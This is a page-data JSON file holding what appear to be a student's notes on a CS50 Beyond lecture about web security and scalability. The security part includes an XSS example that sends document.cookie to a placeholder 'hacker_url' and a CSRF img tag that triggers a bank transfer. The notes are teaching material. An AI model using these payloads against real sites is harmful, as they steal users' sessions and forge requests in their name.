{"data":{"markdownRemark":{"html":"<blockquote>\n<p>Harvard's CS50 Beyond lecture 6 정리</p>\n</blockquote>\n<h3>Security</h3>\n<p>making sure that you, your application, and your users are protected by potential security threats and vulnerabilities</p>\n<h4>Git Vulnerabilities</h4>\n<ul>\n<li>\n<p>github repos: anyone can look at the code to take advantage of potential vulnerabilites (bcuz public as default)</p>\n<ul>\n<li>ex. git commit history: credentials can be exposed</li>\n</ul>\n</li>\n<li>\n<p>solutions: </p>\n<ul>\n<li>change the credentials</li>\n<li>git purge (overwrite history)</li>\n</ul>\n</li>\n</ul>\n<h4>HTML Vulnerabilities</h4>\n<ul>\n<li>phishing links: url leads to somewhere different from specified content</li>\n</ul>\n<h4>HTTPS and Cryptography</h4>\n<ul>\n<li>securely deliver data from one location to another location</li>\n<li>\n<p>use <strong>Cryptography</strong></p>\n<ul>\n<li>\n<p><strong>Secret-key Cryptography</strong>: use a singly key to encrypt and decrypt messages (key &#x26; ciphertext is transferred)</p>\n<ul>\n<li>problem: key is also sent through the internet</li>\n</ul>\n</li>\n<li>\n<p><strong>Public-key Cryptography</strong>: use public key to encrypt and private key to decrypt message </p>\n<ul>\n<li>receiver generates private and public key, shares only the public key to sender, and sender transfers ciphertext which receiver can decrypt using private key</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4>Environment Variables</h4>\n<ul>\n<li>don't store credentials in repos</li>\n<li>store credentials in environment variables</li>\n</ul>\n<h4>Database Vulnerabilities</h4>\n<p>database security concerns</p>\n<ul>\n<li>\n<p>passwords: passwords can be exposed</p>\n<ul>\n<li>solution: store hashed version of passwords</li>\n</ul>\n</li>\n<li>\n<p>data leaks:</p>\n<ul>\n<li>ex. forgot your password message: indication of which id exists or not</li>\n<li>ex. response time: can retrieve information based on response time</li>\n</ul>\n</li>\n</ul>\n<h4>SQL Injection</h4>\n<ul>\n<li>database queries that can inject problems to disrupt the SQL database</li>\n<li>solution: use libraries, escape characters</li>\n</ul>\n<h4>JavaScript Vulnerabilities</h4>\n<p>javascript opens a whole host of potential security vulnerabilites</p>\n<ul>\n<li>\n<p><strong>Cross-site Scripting</strong>: injecting javascript to expose private information</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- injecting javascript into the request path (url) to reveal cookie of user --></span>\n/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script language-javascript\">document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>'img src<span class=\"token operator\">=</span><span class=\"token string\">\"hacker_url?cookie=\"</span> <span class=\"token operator\">+</span> document<span class=\"token punctuation\">.</span>cookie <span class=\"token operator\">+</span> <span class=\"token string\">\">\"</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre></div>\n</li>\n<li>\n<p><strong>Cross-site Request Forgery</strong>: some other site can make request to another site</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- automatically fetches src which leads to requesting for  --></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>http://yourbank.com/transfer?to=brian&amp;amt=2800<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></code></pre></div>\n</li>\n</ul>\n<h3>Scalability</h3>\n<p>what do you need consider for having multiple people using the same application at the same time</p>\n<h4>Benchmarking</h4>\n<h4>Load Balancing</h4>\n<h4>Load Balancing Methods</h4>\n<h4>Session-aware Load Balancing</h4>\n<h4>Auto-scaling</h4>\n<h4>Scaling Databases</h4>\n<h4>Database Partitioning</h4>\n<h4>Database Replication</h4>\n<h4>Singly-primary Replication</h4>\n<h4>Multi-primary Replication</h4>\n<h4>Caching</h4>\n<h4>Client-side Caching</h4>","frontmatter":{"path":"/cs50/beyond/6","title":"CS50 Beyond lecture 6 - Security & Scalability","date":"2019-06-09","tags":["CS50","CS50 Beyond","Security","Scalability"]}}},"pageContext":{"isCreatedByStatefulCreatePages":false}}